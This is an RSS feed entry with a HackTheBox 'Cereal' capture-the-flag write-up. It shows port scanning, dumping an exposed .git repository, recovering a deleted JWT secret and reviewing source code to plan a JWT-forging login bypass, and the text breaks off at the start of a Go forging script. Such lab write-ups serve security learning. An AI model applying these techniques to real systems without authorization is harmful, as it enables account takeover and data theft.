<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Python on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/python/</link>
    <description>Recent content in Python on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Wed, 09 Jun 2021 07:33:40 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/python/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Cereal (User only)</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-cereal/</link>
      <pubDate>Wed, 09 Jun 2021 07:33:40 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-cereal/</guid>
      <description>Doing code reviews in order to chain XSS, SSRF, and Deserialization vulnerabilities to gain a foothold</description>
      <content:encoded><![CDATA[<p>Cereal is a hard difficulty Windows machine that features a misconfigured web server which exposes source code of the currently hosted web application. A deleted JWT secrets is found in the source code, which can be used to forge my own JWT token and bypass the application login page. After reviewing the source code, the web app is found to be vulnerable to a deserialization attack. There is also a XSS vulnerability in one of the package used by the application. Chaining these vulnerabilities allows me to gain a foothold in the system.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Code review</li>
<li>JWT authentication bypass</li>
<li>XSS exploitation</li>
<li>.NET deserialization</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux 2019.4 (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>All TCP ports scan with <code>nmap</code> discovers three open ports: SSH on port 22, HTTP on port 80, and HTTP on port 443.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ nmap -p- --min-rate <span style="color:#ae81ff">1000</span> --reason -oA nmap/10-tcp-allport-cereal 10.10.10.217
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-06-04 23:45 EDT

...&lt;SNIP&gt;...
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl <span style="color:#ae81ff">127</span>
80/tcp  open  http    syn-ack ttl <span style="color:#ae81ff">127</span>
443/tcp open  https   syn-ack ttl <span style="color:#ae81ff">127</span>

Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 118.08 seconds
</code></pre></div><p>I&rsquo;ll run another scan with <code>nmap</code> &rsquo;s default scripts.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ nmap -p 22,80,443 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.217
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-06-04 23:51 EDT

...&lt;SNIP&gt;...
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_7.7 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">2048</span> 08:8e:fe:04:8c:ad:6f:df:88:c7:f3:9a:c5:da:6d:ac <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> fb:f5:7b:a1:68:07:c0:7b:73:d2:ad:33:df:0a:fc:ac <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> cc:0e:70:ec:33:42:59:78:31:c0:4e:c2:a5:c9:0e:1e <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp  open  http     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://cereal.htb/
|_https-redirect: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
443/tcp open  ssl/http Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Cereal
| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>cereal.htb
| Subject Alternative Name: DNS:cereal.htb, DNS:source.cereal.htb
| Not valid before: 2020-11-11T19:57:18
|_Not valid after:  2040-11-11T20:07:19
|_ssl-date: 2021-06-05T03:51:48+00:00; +5s from scanner time.
| tls-alpn: 
|_  http/1.1
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 23.34 seconds
</code></pre></div><p>This time <code>nmap</code> found two hostnames from the SSL certificate: <code>cereal.htb</code> and <code>source.cereal.htb</code>.</p>
<p>I&rsquo;ll add those hostnames to my <code>/etc/hosts</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ echo <span style="color:#e6db74">&#39;10.10.10.217 cereal.htb source.cereal.htb&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80">TCP 80</h3>
<p>It redirects to the HTTPS.</p>
<h3 id="tcp-443---cerealhtb">TCP 443 - cereal.htb</h3>
<p>Following the redirection ends up at a login form.</p>
<p><div class="img-container"><img src="imgs/image-20210605110703967.png" alt="image-20210605110703967"  /></div>
</p>
<p>I tried a few common credentials but doesn&rsquo;t seem to work here.</p>
<p>Inspecting the source reveals that this site is a react based application.</p>
<p><div class="img-container"><img src="imgs/image-20210609080804206.png" alt="image-20210609080804206"  /></div>
</p>
<p>If I track down the authentication process, this site store the authentication data in browser&rsquo;s local storage with a key name of <code>currentUser</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210609082429730.png" alt="image-20210609082429730"  /></div>
</p>
<p>But l&rsquo;ll leave it for now.</p>
<p>I also did a gobuster scan, but didn&rsquo;t find anything useful.</p>
<h3 id="tcp-443---sourcecerealhtb">TCP 443 - source.cereal.htb</h3>
<p>Visiting <code>source.cereal.htb</code> shows a server error message of an ASP.net application:</p>
<p><div class="img-container"><img src="imgs/image-20210605111410148.png" alt="image-20210605111410148"  /></div>
</p>
<p>Nothing I can do on this page, but I&rsquo;ll take note on the leaked file path:</p>
<ul>
<li><code>C:\inetpub\source\default.aspx</code></li>
</ul>
<h4 id="gobuster">Gobuster</h4>
<p><code>gobuster</code> scan discovers a git repository, and there is also an upload directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ gobuster dir -u https://source.cereal.htb -k -w /opt/SecLists/Discovery/Web-Content/common.txt -x aspx,txt
<span style="color:#f92672">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     https://source.cereal.htb
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              aspx,txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
<span style="color:#f92672">===============================================================</span>
2021/06/05 00:52:32 Starting gobuster in directory enumeration mode
<span style="color:#f92672">===============================================================</span>
/.git/HEAD            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 23<span style="color:#f92672">]</span>
/Default.aspx         <span style="color:#f92672">(</span>Status: 500<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 10090<span style="color:#f92672">]</span>
/aspnet_client        <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 163<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://source.cereal.htb/aspnet_client/<span style="color:#f92672">]</span>
/default.aspx         <span style="color:#f92672">(</span>Status: 500<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 9727<span style="color:#f92672">]</span>                                              
/uploads              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 157<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; https://source.cereal.htb/uploads/<span style="color:#f92672">]</span>      
                                                                                              
<span style="color:#f92672">===============================================================</span>
2021/06/05 00:54:41 Finished
<span style="color:#f92672">===============================================================</span>
</code></pre></div><p>Accessing the <code>.git</code> and the <code>uploads</code> directory are forbidden.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ curl -I -k http://source.cereal.htb/.git/ <span style="color:#f92672">&amp;&amp;</span> curl -I -k http://source.cereal.htb/uploads/
HTTP/1.1 <span style="color:#ae81ff">403</span> Forbidden
Content-Length: <span style="color:#ae81ff">1233</span>
Content-Type: text/html
Server: Microsoft-IIS/10.0
X-Powered-By: Sugar
Date: Sat, <span style="color:#ae81ff">05</span> Jun <span style="color:#ae81ff">2021</span> 05:01:25 GMT

HTTP/1.1 <span style="color:#ae81ff">403</span> Forbidden
Content-Length: <span style="color:#ae81ff">1233</span>
Content-Type: text/html
Server: Microsoft-IIS/10.0
X-Powered-By: Sugar
Date: Sat, <span style="color:#ae81ff">05</span> Jun <span style="color:#ae81ff">2021</span> 05:08:16 GMT
</code></pre></div><p>But requesting files under <code>.git</code> directory are allowed.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ curl -I -k http://source.cereal.htb/.git/HEAD
HTTP/1.1 <span style="color:#ae81ff">200</span> OK
Content-Length: <span style="color:#ae81ff">23</span>
Content-Type: text/plain
Last-Modified: Wed, <span style="color:#ae81ff">11</span> Nov <span style="color:#ae81ff">2020</span> 20:09:34 GMT
Accept-Ranges: bytes
ETag: <span style="color:#e6db74">&#34;adc1d19266b8d61:0&#34;</span>
Server: Microsoft-IIS/10.0
X-Powered-By: Sugar
Date: Sat, <span style="color:#ae81ff">05</span> Jun <span style="color:#ae81ff">2021</span> 05:01:29 GMT

→ root@kali «cereal» «10.10.14.3» 
$ curl -s -k http://source.cereal.htb/.git/HEAD
ref: refs/heads/master
</code></pre></div><p>I&rsquo;ll note the <code>uploads</code> directory</p>
<h3 id="git">Git</h3>
<h4 id="dumping-git-directory">Dumping .git directory</h4>
<p>With <a href="https://github.com/arthaud/git-dumper">git-dumper</a>, I could get all the files in that <code>.git</code> directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «cereal» «10.10.14.3» 
$ mkdir loot/source-cereal-git <span style="color:#f92672">&amp;&amp;</span> ./git-dumper.py https://source.cereal.htb/.git loot/source-cereal-git 
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Testing https://source.cereal.htb/.git/HEAD <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Testing https://source.cereal.htb/.git/ <span style="color:#f92672">[</span>403<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching common files
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.gitignore <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/hooks/applypatch-msg.sample <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/COMMIT_EDITMSG <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/description <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
...&lt;SNIP&gt;...
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Finding refs/
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/ORIG_HEAD <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/config <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/FETCH_HEAD <span style="color:#f92672">[</span>404<span style="color:#f92672">]</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/HEAD <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
...&lt;SNIP&gt;...
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Finding packs
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Finding objects
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching objects
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Fetching https://source.cereal.htb/.git/objects/8f/2a1a88f15b9109e1f63e4e4551727bfb38eee5 <span style="color:#f92672">[</span>200<span style="color:#f92672">]</span>
...&lt;SNIP&gt;...
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Running git checkout .
</code></pre></div><h4 id="git-history">Git History</h4>
<p>I could see the history of this repository by issuing <code>git log</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210605121727689.png" alt="image-20210605121727689"  /></div>
</p>
<p>Aside from the author&rsquo;s names, one commit with the message &ldquo;Security fixes&rdquo; caught my attention.</p>
<p>I immediately run <code>git diff 8f2a 7bd9</code> to compare the first commit with the security fixes and that reveals a deleted JWT secret.</p>
<p><div class="img-container"><img src="imgs/image-20210609090452619.png" alt="image-20210609090452619"  /></div>
</p>
<p>It looks like the security fixes include prevention against deserialization attacks which I&rsquo;ll note that as well as the secret:</p>
<ul>
<li>JWT secret: <code>secretlhfIH&amp;FY*#oysuflkhskjfhefesf</code></li>
</ul>
<h3 id="source-code-analysis-1">Source Code Analysis #1</h3>
<blockquote>
<p>I pointed my sh*tty explanation or at least how I understand it with <code>// &lt;==</code> or  <code># &lt;==</code> in the code snippet. Please, don&rsquo;t bully me for this.</p>
</blockquote>
<h4 id="app-overview">App Overview</h4>
<p>The app consist of ASP.NET (back-end)  and React (front-end).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «source-cereal-git» «10.10.14.3» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> 
$ tree -L <span style="color:#ae81ff">1</span> --dirsfirst
.
├── ClientApp
├── Controllers
├── Migrations
├── Models
├── Pages
├── Properties
├── Services
├── ApplicationOptions.cs
├── appsettings.Development.json
├── appsettings.json
├── CerealContext.cs
├── Cereal.csproj
├── DownloadHelper.cs
├── ExtensionMethods.cs
├── IPAddressHandler.cs
├── IPRequirement.cs
├── Program.cs
└── Startup.cs
</code></pre></div><p>The source code of previously seen React app at <code>cereal.htb</code> is on the ClientApp folder.</p>
<p>Here is the overview of app execution flow:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Program.cs
 |
 v
Startup.cs  -&gt; Loads appsettings.json
 |
 v
React client
</code></pre></div><p>Looking into the <code>appsettings.js</code>, I could obtain the following information:</p>
<ul>
<li>There is IP whitelist</li>
<li>There are two rules that looks like limiting requests and it&rsquo;ll reset after certain period. One of them is limiting a post request to an endpoint called <code>/requests</code>.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
<span style="color:#960050;background-color:#1e0010">...&lt;SNIP&gt;...</span>
  <span style="color:#f92672">&#34;AllowedHosts&#34;</span>: <span style="color:#e6db74">&#34;*&#34;</span>,
  <span style="color:#f92672">&#34;ApplicationOptions&#34;</span>: {
    <span style="color:#f92672">&#34;Whitelist&#34;</span>: [ <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#e6db74">&#34;::1&#34;</span> ]
  },
  <span style="color:#f92672">&#34;IpRateLimiting&#34;</span>: {
    <span style="color:#f92672">&#34;EnableEndpointRateLimiting&#34;</span>: <span style="color:#66d9ef">true</span>,
    <span style="color:#f92672">&#34;StackBlockedRequests&#34;</span>: <span style="color:#66d9ef">false</span>,
    <span style="color:#f92672">&#34;RealIpHeader&#34;</span>: <span style="color:#e6db74">&#34;X-Real-IP&#34;</span>,
    <span style="color:#f92672">&#34;ClientIdHeader&#34;</span>: <span style="color:#e6db74">&#34;X-ClientId&#34;</span>,
    <span style="color:#f92672">&#34;HttpStatusCode&#34;</span>: <span style="color:#ae81ff">429</span>,
    <span style="color:#f92672">&#34;IpWhitelist&#34;</span>: [ <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#e6db74">&#34;::1&#34;</span> ],
    <span style="color:#f92672">&#34;EndpointWhitelist&#34;</span>: [],
    <span style="color:#f92672">&#34;ClientWhitelist&#34;</span>: [],
    <span style="color:#f92672">&#34;GeneralRules&#34;</span>: [
      {
        <span style="color:#f92672">&#34;Endpoint&#34;</span>: <span style="color:#e6db74">&#34;post:/requests&#34;</span>,
        <span style="color:#f92672">&#34;Period&#34;</span>: <span style="color:#e6db74">&#34;5m&#34;</span>,
        <span style="color:#f92672">&#34;Limit&#34;</span>: <span style="color:#ae81ff">2</span>
      },
      {
        <span style="color:#f92672">&#34;Endpoint&#34;</span>: <span style="color:#e6db74">&#34;*&#34;</span>,
        <span style="color:#f92672">&#34;Period&#34;</span>: <span style="color:#e6db74">&#34;5m&#34;</span>,
        <span style="color:#f92672">&#34;Limit&#34;</span>: <span style="color:#ae81ff">150</span>
      }
    ]
  }
}

</code></pre></div><h4 id="authentication-vulnerability">Authentication Vulnerability</h4>
<p>Looking into the <code>Startup.cs</code> file, I could see there is a potential authentication bypass. On the following code snippet, the application clearly doesn&rsquo;t validate the issuer and the audience of a JWT token, and <a href="https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer">this can raise a security issue</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">...&lt;SNIP&gt;...
    <span style="color:#66d9ef">var</span> key = Encoding.ASCII.GetBytes(<span style="color:#e6db74">&#34;*&#34;</span>);
    services.AddAuthentication(x =&gt;
    {
        x.DefaultAuthenticateScheme = JwtBearerDefaults.AuthenticationScheme;
        x.DefaultChallengeScheme = JwtBearerDefaults.AuthenticationScheme;
    })
    .AddJwtBearer(x =&gt;
    {
        x.RequireHttpsMetadata = <span style="color:#66d9ef">false</span>;
        x.SaveToken = <span style="color:#66d9ef">true</span>;
        x.TokenValidationParameters = <span style="color:#66d9ef">new</span> TokenValidationParameters
        {
            ValidateIssuerSigningKey = <span style="color:#66d9ef">true</span>,
            IssuerSigningKey = <span style="color:#66d9ef">new</span> SymmetricSecurityKey(key),
            ValidateIssuer = <span style="color:#66d9ef">false</span>, <span style="color:#75715e">// &lt;== No validation
</span><span style="color:#75715e"></span>            ValidateAudience = <span style="color:#66d9ef">false</span> <span style="color:#75715e">// &lt;== No validation
</span><span style="color:#75715e"></span>        };
    });
...&lt;SNIP&gt;...
</code></pre></div><p>The JWT token itself is forged at <code>Services/UserService.cs</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp"><span style="color:#66d9ef">public</span> User Authenticate(<span style="color:#66d9ef">string</span> username, <span style="color:#66d9ef">string</span> password)
        {
            <span style="color:#66d9ef">using</span> (<span style="color:#66d9ef">var</span> db = <span style="color:#66d9ef">new</span> CerealContext())
            {
                <span style="color:#66d9ef">var</span> user = db.Users.Where(x =&gt; x.Username == username &amp;&amp; x.Password == password).SingleOrDefault();

                <span style="color:#75715e">// return null if user not found
</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">if</span> (user == <span style="color:#66d9ef">null</span>)
                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;

                <span style="color:#75715e">// authentication successful so generate jwt token
</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">var</span> tokenHandler = <span style="color:#66d9ef">new</span> JwtSecurityTokenHandler();
                <span style="color:#66d9ef">var</span> key = Encoding.ASCII.GetBytes(<span style="color:#e6db74">&#34;*&#34;</span>);
                <span style="color:#66d9ef">var</span> tokenDescriptor = <span style="color:#66d9ef">new</span> SecurityTokenDescriptor
                {
                    Subject = <span style="color:#66d9ef">new</span> ClaimsIdentity(<span style="color:#66d9ef">new</span> Claim[]
                    {
                        <span style="color:#66d9ef">new</span> Claim(ClaimTypes.Name, user.UserId.ToString())
                    }),
                    Expires = DateTime.UtcNow.AddDays(<span style="color:#ae81ff">7</span>),
                    SigningCredentials = <span style="color:#66d9ef">new</span> SigningCredentials(<span style="color:#66d9ef">new</span> SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature)
                };
                <span style="color:#66d9ef">var</span> token = tokenHandler.CreateToken(tokenDescriptor);
                user.Token = tokenHandler.WriteToken(token);

                <span style="color:#66d9ef">return</span> user.WithoutPassword();
            }
</code></pre></div><p>When the user attempts to authenticate, the code snippet above checks to see if the user&rsquo;s credentials match those in the database. If the credentials match, the app will generate a JWT token for that user.</p>
<p>The user model is defined in here <code>Models/User.cs</code>. From here, I can assume each JWT token contains at least a user&rsquo;s ID, expiration time (7 days), Username, and Token.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">...&lt;SNIP&gt;...
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>
    {
<span style="color:#a6e22e">        [Key]</span>
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> UserId { <span style="color:#66d9ef">get</span>; <span style="color:#66d9ef">set</span>; }
<span style="color:#a6e22e">        [Required]</span>
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> Username { <span style="color:#66d9ef">get</span>; <span style="color:#66d9ef">set</span>; }
<span style="color:#a6e22e">        [Required]</span>
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> Password { <span style="color:#66d9ef">get</span>; <span style="color:#66d9ef">set</span>; }
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">string</span> Token { <span style="color:#66d9ef">get</span>; <span style="color:#66d9ef">set</span>; }
    }
...&lt;SNIP&gt;...
</code></pre></div><p>Interestingly, in <code>ClientApp/src/LoginPage/LoginPage.jsx</code>, the authentication process doesn&rsquo;t look like it needs server/back-end validation, because it checks the browser&rsquo;s local storage first.</p>
<blockquote>
<p>It&rsquo;ll ask the server if we press the login button (POST request).</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">...<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;</span>...
<span style="color:#66d9ef">import</span> { <span style="color:#a6e22e">authenticationService</span> } <span style="color:#a6e22e">from</span> <span style="color:#e6db74">&#39;../_services&#39;</span>; <span style="color:#75715e">// &lt;==
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">LoginPage</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">React</span>.<span style="color:#a6e22e">Component</span> {
    <span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">props</span>) {
        <span style="color:#66d9ef">super</span>(<span style="color:#a6e22e">props</span>);

        <span style="color:#75715e">// redirect to home if already logged in
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">authenticationService</span>.<span style="color:#a6e22e">currentUserValue</span>) {  <span style="color:#75715e">// &lt;==
</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">props</span>.<span style="color:#a6e22e">history</span>.<span style="color:#a6e22e">push</span>(<span style="color:#e6db74">&#39;/&#39;</span>); 
        }
    }

    <span style="color:#a6e22e">render</span>() {
        <span style="color:#66d9ef">return</span> (
            <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">div</span><span style="color:#f92672">&gt;</span>
                <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">h2</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">Login</span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/h2&gt;</span>
...<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;</span>...
</code></pre></div><p>I could track the <code>authenticationService.currentUserValue</code> and it is defined in  <code>ClientApp/src/_services/authentication.service.jsx</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">currentUserSubject</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">BehaviorSubject</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">localStorage</span>.<span style="color:#a6e22e">getItem</span>(<span style="color:#e6db74">&#39;currentUser&#39;</span>))); <span style="color:#75715e">// &lt;==
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">export</span> <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">authenticationService</span> <span style="color:#f92672">=</span> {
    <span style="color:#a6e22e">login</span>,
    <span style="color:#a6e22e">logout</span>,
    <span style="color:#a6e22e">currentUser</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">currentUserSubject</span>.<span style="color:#a6e22e">asObservable</span>(),<span style="color:#75715e">// &lt;==
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">get</span> <span style="color:#a6e22e">currentUserValue</span> () { <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">currentUserSubject</span>.<span style="color:#a6e22e">value</span> } <span style="color:#75715e">// &lt;==
</span><span style="color:#75715e"></span>};
</code></pre></div><h3 id="authentication-bypass">Authentication Bypass</h3>
<p>I could summarize the previous code analysis to these points:</p>
<ul>
<li>As long as the browser&rsquo;s local storage contains a key of <code>currentUser</code> which has JWT token in its value, the client app will logs the user in.</li>
<li>No other validation in JWT token except the user&rsquo;s ID and expires date. (based on <code>Services/UserService.cs</code>)</li>
<li>Based on  <code>Models/User.cs</code>,  <code>Services/UserService.cs</code>, and  <code>ClientApp/src/_services/auth-header.js</code> , the form of <code>currentUser</code> is something like this:
<ul>
<li><code>&quot;currentUser&quot; : &quot;{ &quot;userId&quot;: &quot;0&quot;, &quot;username&quot;: &quot;name&quot;, &quot;token&quot;: &quot;JWT token&quot;}&quot;</code>.</li>
</ul>
</li>
</ul>
<h4 id="tactics">Tactics</h4>
<p>Here is the tactics to bypass the login page:</p>
<ul>
<li>Since there is no validation on the issuer, and I have the JWT secret key, I could forge my own JWT.</li>
<li>I&rsquo;ll put the forged JWT token to browser&rsquo;s local storage of <code>cereal.htb</code> with the key name of <code>currentUser</code>.</li>
<li>Simply refresh the page afterwards and see if it logs me in.</li>
</ul>
<h4 id="forge-jwt">Forge JWT</h4>
<p>To forge our own JWT, you could try <a href="https://github.com/ticarpi/jwt_tool">jwtool</a>, but I tried to forge my own JWT using Golang lol.</p>
<p>Here is the code:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>

<span style="color:#f92672">import</span> (
	<span style="color:#e6db74">&#34;encoding/json&#34;</span>
	<span style="color:#e6db74">&#34;fmt&#34;</span>
	<span style="color:#e6db74">&#34;time&#34;</span>

